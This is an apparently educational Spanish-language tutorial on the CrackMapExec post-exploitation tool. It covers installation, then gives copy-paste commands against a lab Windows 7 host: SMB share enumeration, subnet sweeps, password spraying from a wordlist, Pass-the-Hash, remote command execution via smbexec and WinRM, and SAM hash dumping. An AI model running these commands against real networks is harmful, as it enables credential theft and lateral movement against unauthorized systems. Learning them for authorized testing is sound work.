
---
# CrackMapExec — PoC

## ¿Qué es CrackMapExec (CME)?

> CrackMapExec (CME) es una herramienta post-explotación y de evaluación de seguridad orientada a redes Windows/Active Directory. Se trata de una utilidad escrita en Python que combina múltiples módulos y bibliotecas (Impacket, MS-RPC, SMB, WinRM, etc.) para permitir a los pentesters automatizar la enumeración, explotación y post-explotación en entornos Windows a gran escala.

Principales capacidades:

- Escaneo y enumeración de hosts y servicios (SMB, WinRM, RDP, LDAP).

- Prueba y verificación de credenciales (listas de usuarios/contraseñas, hashes NTLM).

- Ejecución remota de comandos (WinRM, SMB exec, PSExec, WMI).

- Carga y ejecución de módulos personalizados (post-explotación y recolección de información).

- Integración con Impacket y otros paquetes para técnicas avanzadas (Pass-the-Hash, Kerberos, etc.).


## Instalación rápida con pipx (recomendada)

Vamos a instalar CME de forma aislada usando `pipx` para evitar conflictos con el Python del sistema:

```bash
# 1) instalar pipx si no lo tienes
python3 -m pip install --user pipx
python3 -m pipx ensurepath
# cierra y vuelve a abrir tu terminal si pipx añadió rutas o haz `source ~/.bashrc`

# 2) instalar CME directamente desde el repositorio (pipx creará un venv aislado)
pipx install git+https://github.com/Porchetta-Industries/CrackMapExec

# 3) probar
crackmapexec --version
crackmapexec -h
```

Notas:

- `pipx` instala el paquete en `~/.local/pipx/venvs/` y deja un ejecutable en `~/.local/bin/`. Asegúrate de que `~/.local/bin` está en tu `PATH`.

- Si prefieres la imagen oficial en Docker, puedes usar `docker pull byt3bl33d3r/crackmapexec`.


## Usos habituales en pentesting

CME es una navaja suiza para redes Windows/AD; aquí describimos los usos más comunes durante una evaluación de seguridad:

### 1. Enumeración a gran escala

- `crackmapexec smb 10.0.0.0/24 -u user -p pass` — comprueba acceso SMB en toda una subred.

- Permite listar sesiones, shares y privilegios en hosts alcanzables.


### 2. Pruebas de credenciales y lateral movement

- Probar listas de usuarios/contraseñas o hashes NTLM contra SMB/WinRM/RDP.

- `crackmapexec smb target -u user -H <NTLM_hash>` — Pass-the-Hash.


### 3. Ejecución remota

- `crackmapexec smb target -u user -p pass --exec-method smbexec -x 'whoami'`

- `crackmapexec winrm target -u user -p pass -x 'powershell.exe -c <script>'`


### 4. Recolección de información y post-explotación

- Uso de módulos para volcar SAM, extraer LSA secrets, enumerar GPOs, realizar credential harvesting, etc.

- `crackmapexec smb target -u user -p pass -M <module>`


### 5. Automatización y reporting

- Ejecutar barridos automatizados sobre rangos grandes de IP y exportar resultados para análisis posteriores.


## Buenas prácticas y advertencias legales

- Solo usar CME en entornos que controlamos o donde tengamos autorización explícita.

- Registrar todas las acciones y resultados para reproducibilidad y reporting.

- En laboratorios, ejecutar CME con un usuario no root salvo cuando sea necesario.


## Recursos y documentación

- Repositorio original: [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

- Forks y mantenimientos comunitarios (si el original está parcheado/archivado): buscar forks actualizados en GitHub.


---

## PoC: ejemplos prácticos (Windows 7 de laboratorio)

A continuación incluimos una serie de ejemplos prácticos organizados por objetivo. En todos los comandos sustituimos `TARGET` o `10.0.0.5` por la IP de la máquina Windows 7 de laboratorio y `USER`, `PASS` o `HASH` por dichas credenciales. Cada comando está en su propio bloque para poder copiar/pegar.

### 1) Comprobación rápida de versión (sanity check)

```bash
crackmapexec --version
```

### 2) Enumeración SMB de un host concreto

```bash
crackmapexec smb 10.0.0.5 -u USER -p PASS --shares
```

### 3) Escaneo de una subred para hosts SMB accesibles

```bash
crackmapexec smb 10.0.0.0/24 -u usuario -p contraseña --shares
```

### 4) Prueba de credenciales (spray simple) contra SMB usando un único usuario y fichero de contraseñas

```bash
crackmapexec smb 10.0.0.5 -u USER -p /ruta/wordlist_passwords.txt
```

### 5) Pass-the-Hash (usar NTLM hash en lugar de contraseña)

```bash
crackmapexec smb 10.0.0.5 -u USER -H <NTLM_HASH>
```

### 6) Ejecución remota de un comando con el método smbexec

```bash
crackmapexec smb 10.0.0.5 -u USER -p PASS --exec-method smbexec -x "whoami && systeminfo | findstr /B /C:\"OS Name\" /C:\"System Type\""
```

### 7) Ejecución remota via WinRM (PowerShell)

```bash
crackmapexec winrm 10.0.0.5 -u USER -p PASS -x "powershell -NoProfile -NonInteractive -Command \"Get-LocalUser; whoami\""
```

### 8) Uso de un módulo (ejemplo: volcado de SAM si existe el módulo)

```bash
crackmapexec smb 10.0.0.5 -u USER -p PASS -M hashdump
```

### 9) Enumeración avanzada: listar sessions y usuarios conectados

```bash
crackmapexec smb 10.0.0.5 -u USER -p PASS --sessions
```

### 10) Guardar resultados en CSV/JSON para reporting

```bash
crackmapexec smb 10.0.0.0/24 -u USER -p PASS -o results.json
```

### 11) Uso desde Docker (ejecutar un comando contra la VM Windows 7)

```bash
docker run --rm -it --net=host byt3bl33d3r/crackmapexec crackmapexec smb 10.0.0.5 -u USER -p PASS --shares
```

### 12) Desinstalación/limpieza pipx (si queremos revertir la instalación rápida)

```bash
pipx uninstall CrackMapExec || pipx uninstall crackmapexec
```


---

